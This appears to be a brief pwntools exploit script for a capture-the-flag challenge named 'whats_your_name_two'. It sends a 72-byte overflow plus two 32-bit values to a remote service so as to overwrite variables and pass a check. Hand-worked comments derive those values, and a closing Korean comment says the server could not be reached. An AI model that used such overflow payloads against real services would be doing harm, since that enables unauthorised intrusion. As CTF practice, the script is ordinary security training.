from pwn import *
r = remote("198.211.115.81", 10002)
#r = process("./whats_your_name_two")
#v7 = 1413825868 = 5445 454C
#ffff ffff - 5445 454c = ABBA BAB3
#v6 = 1397445710 = 534B 544E
#ACB4 ABB1
payload = b"a"*72
payload += p32(0x534B544E)
payload += p32(0x5445454C)
r.sendline(payload);

r.interactive()

#맞추긴 했는데 서버 연결이 안됨.. flag를 못얻음